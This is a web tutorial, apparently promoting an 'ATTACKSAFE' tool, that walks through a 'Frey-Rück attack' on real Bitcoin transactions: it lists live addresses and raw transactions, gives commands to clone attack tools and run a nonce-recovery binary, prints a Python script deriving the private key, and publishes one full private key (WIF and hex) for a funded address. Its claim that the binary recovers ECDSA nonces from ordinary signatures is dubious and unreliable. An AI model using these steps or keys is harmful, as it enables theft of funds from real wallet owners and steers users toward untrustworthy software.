
<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/018-1024x576.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1100"></figure>


---

* Tutorial: https://youtu.be/wqHES7r1qyc
* Tutorial: https://cryptodeeptech.ru/frey-ruck-attack

---


<p>In this article, we implement an efficient&nbsp;<a href="https://attacksafe.ru/frey-ruck-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener">Frey-Rück Attack</a>&nbsp;algorithm for signing&nbsp;<code>ECDSA</code>a transaction on the Bitcoin blockchain.&nbsp;In our earlier posts, we touched on the topic of signature vulnerability several times&nbsp;<code>ECDSA</code>.&nbsp;With a critical vulnerability in the Bitcoin blockchain transaction, we can solve the rather difficult discrete logarithm problem to extract the&nbsp;<code>ECDSA</code>&nbsp;<em>secret key</em><code>"K" (NONCE)</code>&nbsp;from the vulnerable signature in order to ultimately restore the Bitcoin Wallet, since knowing the secret key we can get the private key.</p>



<p>To do this, there are several algorithms from&nbsp;<a href="https://attacksafe.ru/list-of-bitcoin-attacks/" target="_blank" rel="noreferrer noopener"><strong>the list of popular attacks on Bitcoin</strong></a>&nbsp;, one of which is&nbsp;<strong><a href="https://attacksafe.ru/frey-ruck-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener">“Frey-Rück Attack on Bitcoin”</a></strong>&nbsp;.</p>


<div class="wp-block-image">
<figure class="aligncenter"><a href="https://attacksafe.ru/frey-ruck-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/001-1.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-613" title="www.attacksafe.ru/frey-ruck-attack-on-bitcoin/"></a><figcaption><br><strong><code>www.attacksafe.ru/frey-ruck-attack-on-bitcoin</code></strong></figcaption></figure></div>


<h4>We will not dive into the theoretical aspects of this attack, we will go straight to the experimental part.</h4>



<p>From our practice, we know that there are a lot of vulnerable and weak transactions in the Bitcoin blockchain, and in the process of our cryptanalysis, we found a lot of Bitcoin Addresses, where a large number of signatures&nbsp;<code>ECDSA</code>were made with the disclosure of the&nbsp;<em>secret key</em>&nbsp;<code>"K" (NONCE).</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Consider five Bitcoin Addresses:</h2>



<blockquote class="wp-block-quote"><p><strong><a href="https://btc.exan.tech/address/16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG" target="_blank" rel="noreferrer noopener">16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG</a></strong></p><p><strong><a href="https://btc.exan.tech/address/1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5" target="_blank" rel="noreferrer noopener">1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5</a></strong></p><p><strong><a href="https://btc.exan.tech/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2" target="_blank" rel="noreferrer noopener">16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2</a></strong></p><p><strong><a href="https://btc.exan.tech/address/12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q" target="_blank" rel="noreferrer noopener">12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q</a></strong></p><p><strong><a href="https://btc.exan.tech/address/19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac" target="_blank" rel="noreferrer noopener">19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac</a></strong></p></blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Each Bitcoin Address made two critical vulnerable transactions:</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc.exan.tech/address/16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG" target="_blank" rel="noreferrer noopener">16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG</a></strong></p><p><a href="https://btc.exan.tech/tx/a575ef45375f85d6d3c010dae01df1479e2e0c5b870b80ee757fc2522057db72" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/a575ef45375f85d6d3c010dae01df1479e2e0c5b870b80ee757fc2522057db72</a></p><p><a href="https://btc.exan.tech/tx/81384edbf408aa501814582663386ae25819c7b14c89d69e36250059f2399128" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/81384edbf408aa501814582663386ae25819c7b14c89d69e36250059f2399128</a></p></blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-1.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-644"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-2.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-645"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc.exan.tech/address/1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5" target="_blank" rel="noreferrer noopener">1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5</a></strong></p><p><a href="https://btc.exan.tech/tx/fed0b3472341788b58798d6a124a4d0c66c86535ae5f640cb7e5ba0e175665fb" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/fed0b3472341788b58798d6a124a4d0c66c86535ae5f640cb7e5ba0e175665fb</a></p><p><a href="https://btc.exan.tech/tx/e5bb4aba7dc061059ac163e2dd62b4b025454f5db85e4ec65f45edee97d91393" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/e5bb4aba7dc061059ac163e2dd62b4b025454f5db85e4ec65f45edee97d91393</a></p></blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-3.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-649"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-4.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-651"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc.exan.tech/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2" target="_blank" rel="noreferrer noopener">16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2</a></strong></p><p><a href="https://btc.exan.tech/tx/c393f6b4651ac109cf90476bab878df624a1867c616a8cd69d0710e7676cd6d4" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/c393f6b4651ac109cf90476bab878df624a1867c616a8cd69d0710e7676cd6d4</a></p><p><a href="https://btc.exan.tech/tx/989ba4524367fbaf75e974a5ff2420d48ba32ebedb1416a0a36c3e575be350d6" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/989ba4524367fbaf75e974a5ff2420d48ba32ebedb1416a0a36c3e575be350d6</a></p></blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-5.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-661"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-6.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-663"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc.exan.tech/address/12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q" target="_blank" rel="noreferrer noopener">12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q</a></strong></p><p><a href="https://btc.exan.tech/tx/ac6259da5eb98bf11b5cda804175ac666ebd1b7118da51d206936b43cb368542" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/ac6259da5eb98bf11b5cda804175ac666ebd1b7118da51d206936b43cb368542</a></p><p><a href="https://btc.exan.tech/tx/4ff10d8a7246f0c46acb9fefa6ea23497f6b7825307414ca3fc80bcbae9194af" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/4ff10d8a7246f0c46acb9fefa6ea23497f6b7825307414ca3fc80bcbae9194af</a></p></blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-7.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-667"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-8.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-668"></figure></div>


<blockquote class="wp-block-quote"><p><strong><a href="https://btc.exan.tech/address/19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac" target="_blank" rel="noreferrer noopener">19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac</a></strong></p><p><a href="https://btc.exan.tech/tx/492955688cff583fa5b6677bcb9a90a3010925f7e2204fd464e0e7183a6954db" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/492955688cff583fa5b6677bcb9a90a3010925f7e2204fd464e0e7183a6954db</a></p><p><a href="https://btc.exan.tech/tx/e3dfc0d3b61972d04446214481d8e54623e5e0f2aaf26d7bc01fe5081249b4ea" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/e3dfc0d3b61972d04446214481d8e54623e5e0f2aaf26d7bc01fe5081249b4ea</a></p></blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-9.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-673"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-10.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-675"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Disclosure of the secret key “K” (NONCE) in the Bitcoin blockchain</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Open&nbsp;&nbsp;<strong><a href="https://github.com/demining/TerminalGoogleColab" target="_blank" rel="noreferrer noopener">[TerminalGoogleColab]</a></strong>&nbsp;.</p>



<p>Implementing an efficient&nbsp;<a href="https://attacksafe.ru/frey-ruck-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener"><strong>Frey-Rück Attack</strong></a>&nbsp;algorithm with our&nbsp;<a href="https://github.com/demining/CryptoDeepTools/tree/main/14FreyRuckAttack" target="_blank" rel="noreferrer noopener"><strong>14FreyRuckAttack repository</strong></a></p>



<pre class="wp-block-code"><code>git clone https://github.com/demining/CryptoDeepTools.git

cd CryptoDeepTools/14FreyRuckAttack/

ls</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-28-1024x500.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-926"></figure>



<h3>Install all the packages we need</h3>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-11.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-687"><figcaption><strong><code>requirements.txt</code></strong></figcaption></figure>



<pre class="wp-block-code"><code>wget https://bootstrap.pypa.io/pip/2.7/get-pip.py

sudo python2 get-pip.py

pip2 install -r requirements.txt</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-29-1024x560.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-930"></figure>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-30.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-931"></figure>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-31-1024x441.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-933"></figure>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-32-1024x430.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-935"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2></h2>



<blockquote class="wp-block-quote"><p><strong><a href="https://btc.exan.tech/address/16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG" target="_blank" rel="noreferrer noopener">16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG</a></strong></p><p><a href="https://btc.exan.tech/tx/a575ef45375f85d6d3c010dae01df1479e2e0c5b870b80ee757fc2522057db72" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/a575ef45375f85d6d3c010dae01df1479e2e0c5b870b80ee757fc2522057db72</a></p></blockquote>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-13-1024x80.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-696"></figure>



<pre class="wp-block-code"><code>RawTX = 0100000001599b576edb0e0bf62082a30ff974d04080bfadb4dd9154f4e8949ea8da4c15182c0000006a4730440220061e5f5c2bc146cd5070cdef9cd2376a0b2fbbdbbda698858a38190d06caf1ff0220649db1b4fbaaba2d0669f7f7635157b273146b064248d04e76c25d41971d99a1012103f3b587144f038f7fd504eaebb2159ad97c0ca33c3cbaf7f3899849a9e2c9074bffffffff010000000000000000046a02585800000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001599b576edb0e0bf62082a30ff974d04080bfadb4dd9154f4e8949ea8da4c15182c0000006a4730440220061e5f5c2bc146cd5070cdef9cd2376a0b2fbbdbbda698858a38190d06caf1ff0220649db1b4fbaaba2d0669f7f7635157b273146b064248d04e76c25d41971d99a1012103f3b587144f038f7fd504eaebb2159ad97c0ca33c3cbaf7f3899849a9e2c9074bffffffff010000000000000000046a02585800000000</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-33-1024x263.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-937"></figure>



<pre class="wp-block-code"><code>R = 0x061e5f5c2bc146cd5070cdef9cd2376a0b2fbbdbbda698858a38190d06caf1ff
S = 0x649db1b4fbaaba2d0669f7f7635157b273146b064248d04e76c25d41971d99a1
Z = 0xb8e936d143c8733bb1ede19146f8725fee1d10bfc19e14452a51cef0cb0014d8</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center"><strong>To implement the attack and get the secret key, we will use the&nbsp;</strong><strong><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener">“ATTACKSAFE SOFTWARE” software</a></strong></p>


<div class="wp-block-image">
<figure class="aligncenter"><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-14.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-705"></a><figcaption><strong><code>www.attacksafe.ru/software</code></strong></figcaption></figure></div>


<h2>Access rights:</h2>



<pre class="wp-block-code"><code>chmod +x attacksafe</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-34.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-940"></figure>



<h2>Application:</h2>



<pre class="wp-block-code"><code>./attacksafe -help</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-35.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-943"></figure>



<pre class="wp-block-code"><code>  -version:  software version 
  -list:     list of bitcoin attacks
  -tool:     indicate the attack
  -gpu:      enable gpu
  -time:     work timeout
  -server:   server mode
  -port:     server port
  -open:     open file
  -save:     save file
  -search:   vulnerability search
  -stop:     stop at mode
  -max:      maximum quantity in mode
  -min:      minimum quantity per mode
  -speed:    boost speed for mode
  -range:    specific range
  -crack:    crack mode
  -field:    starting field
  -point:    starting point
  -inject:   injection regimen
  -decode:   decoding mode</code></pre>



<pre class="wp-block-code"><code>./attacksafe -version</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-37.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-948"></figure>



<p><code>"ATTACKSAFE SOFTWARE"</code>includes all popular attacks on Bitcoin.</p>



<h2>Let’s run a list of all attacks:</h2>



<pre class="wp-block-code"><code>./attacksafe -list</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-38-1024x602.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-951"></figure>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-39-1024x602.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-954"></figure>



<p>then choose<code>&nbsp;-tool: frey_ruck_attack</code></p>



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>0100000001599b576edb0e0bf62082a30ff974d04080bfadb4dd9154f4e8949ea8da4c15182c0000006a4730440220061e5f5c2bc146cd5070cdef9cd2376a0b2fbbdbbda698858a38190d06caf1ff0220649db1b4fbaaba2d0669f7f7635157b273146b064248d04e76c25d41971d99a1012103f3b587144f038f7fd504eaebb2159ad97c0ca33c3cbaf7f3899849a9e2c9074bffffffff010000000000000000046a02585800000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool frey_ruck_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool frey_ruck_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-42-1024x261.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-963"></figure>



<p>We launched this attack from&nbsp;<code>-tool frey_ruck_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-43-1024x487.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-965"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xf99718ec8df44d695daa9eedd2b3cbe29d8a14a3fc026baeb279afe47c709de3

RawTX = 0100000001599b576edb0e0bf62082a30ff974d04080bfadb4dd9154f4e8949ea8da4c15182c0000006a4730440220061e5f5c2bc146cd5070cdef9cd2376a0b2fbbdbbda698858a38190d06caf1ff0220649db1b4fbaaba2d0669f7f7635157b273146b064248d04e76c25d41971d99a1012103f3b587144f038f7fd504eaebb2159ad97c0ca33c3cbaf7f3899849a9e2c9074bffffffff010000000000000000046a02585800000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0xf99718ec8df44d695daa9eedd2b3cbe29d8a14a3fc026baeb279afe47c709de3</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To do this, install the&nbsp;<a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>ECPy</strong></a>&nbsp;elliptic curve library :</p>



<pre class="wp-block-code"><code>pip3 install ECPy</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-44-1024x335.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-968"></figure>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0xf99718ec8df44d695daa9eedd2b3cbe29d8a14a3fc026baeb279afe47c709de3</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-45-1024x106.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-971"></figure>



<p><code>(0x061e5f5c2bc146cd5070cdef9cd2376a0b2fbbdbbda698858a38190d06caf1ff , 0x92718ef50eb3f5eb155a244e371194fb5086e58f1d174e88cda0a60a2ed899f7)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x061e5f5c2bc146cd5070cdef9cd2376a0b2fbbdbbda698858a38190d06caf1ff
S = 0x649db1b4fbaaba2d0669f7f7635157b273146b064248d04e76c25d41971d99a1
Z = 0xb8e936d143c8733bb1ede19146f8725fee1d10bfc19e14452a51cef0cb0014d8</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x061e5f5c2bc146cd5070cdef9cd2376a0b2fbbdbbda698858a38190d06caf1ff
point2gen  =   (0x061e5f5c2bc146cd5070cdef9cd2376a0b2fbbdbbda698858a38190d06caf1ff , 0x92718ef50eb3f5eb155a244e371194fb5086e58f1d174e88cda0a60a2ed899f7)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0xf99718ec8df44d695daa9eedd2b3cbe29d8a14a3fc026baeb279afe47c709de3</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use the&nbsp;<em>Python</em>&nbsp;script:&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xf99718ec8df44d695daa9eedd2b3cbe29d8a14a3fc026baeb279afe47c709de3
R = 0x061e5f5c2bc146cd5070cdef9cd2376a0b2fbbdbbda698858a38190d06caf1ff
S = 0x649db1b4fbaaba2d0669f7f7635157b273146b064248d04e76c25d41971d99a1
Z = 0xb8e936d143c8733bb1ede19146f8725fee1d10bfc19e14452a51cef0cb0014d8


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-48.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-978"></figure>



<p><code>PrivKey = 4faa01f7409813181fb5ae8d352796b791cd9df4ba0650df7008f5d9d6be8766</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG
WIF:  KytZsDHWSqKo9YuWTxwmM5D4g511TsLubF3pF7WgXfg3MTG1GfKa
HEX:  4faa01f7409813181fb5ae8d352796b791cd9df4ba0650df7008f5d9d6be8766</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/002.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-755"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://www.blockchain.com/btc/address/16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG">https://www.blockchain.com/btc/address/16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private Key Found!</code></p>



<figure class="wp-block-image"><a href="https://www.blockchain.com/btc/address/16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG" target="_blank" rel="noreferrer noopener"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-16-1024x449.png" alt="Implementing the Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE) from the ECDSA signature when the bitcoin blockchain transaction is critically vulnerable" class="wp-image-781"></a><figcaption><code><strong>www.blockchain.com/btc/address/16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG</strong></code></figcaption></figure>



<p><code>BALANCE: $ 711.37</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><em>The potential threat of losing BTC coins lies in the critical vulnerability of the Bitcoin blockchain transaction, so we strongly recommend that everyone always update the software and use only verified devices.</em></p></blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>With detailed cryptanalysis, we also found a critical vulnerability in&nbsp;<a href="https://btc.exan.tech/tx/81384edbf408aa501814582663386ae25819c7b14c89d69e36250059f2399128" target="_blank" rel="noreferrer noopener"><strong>81384edbf408aa501814582663386ae25819c7b14c89d69e36250059f2399128</strong></a>&nbsp;for the same Bitcoin Address<strong><code>&nbsp;TXID:</code></strong><a href="https://btc.exan.tech/tx/81384edbf408aa501814582663386ae25819c7b14c89d69e36250059f2399128" target="_blank" rel="noreferrer noopener"><strong></strong></a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc.exan.tech/address/16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG" target="_blank" rel="noreferrer noopener">16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG</a></strong></p><p><a href="https://btc.exan.tech/tx/81384edbf408aa501814582663386ae25819c7b14c89d69e36250059f2399128" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/81384edbf408aa501814582663386ae25819c7b14c89d69e36250059f2399128</a></p></blockquote>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-15-1024x97.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-771"></figure>



<pre class="wp-block-code"><code>RawTX = 01000000011c2b74d4b3ccdd96201841bce8931efa4b40c0dcd11ce52bafe3167bc5c7f741120000006b483045022003af10d2cd5db13bacedc903c00a76d93d1e1749fff30d030bdf13ead615e644022100a66c5b518e61b1dd3b9e27068bcd5286d32690023fa69b845972e4b09800ac8a012103f3b587144f038f7fd504eaebb2159ad97c0ca33c3cbaf7f3899849a9e2c9074bffffffff010000000000000000046a02585800000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 01000000011c2b74d4b3ccdd96201841bce8931efa4b40c0dcd11ce52bafe3167bc5c7f741120000006b483045022003af10d2cd5db13bacedc903c00a76d93d1e1749fff30d030bdf13ead615e644022100a66c5b518e61b1dd3b9e27068bcd5286d32690023fa69b845972e4b09800ac8a012103f3b587144f038f7fd504eaebb2159ad97c0ca33c3cbaf7f3899849a9e2c9074bffffffff010000000000000000046a02585800000000
</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-47-1024x243.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-975"></figure>



<pre class="wp-block-code"><code>R = 0x03af10d2cd5db13bacedc903c00a76d93d1e1749fff30d030bdf13ead615e644
S = 0xa66c5b518e61b1dd3b9e27068bcd5286d32690023fa69b845972e4b09800ac8a
Z = 0xb6d536f025718d424e97ea40e0a86eb32f3f7d3673c4d0decb1a71466235d4de</code></pre>



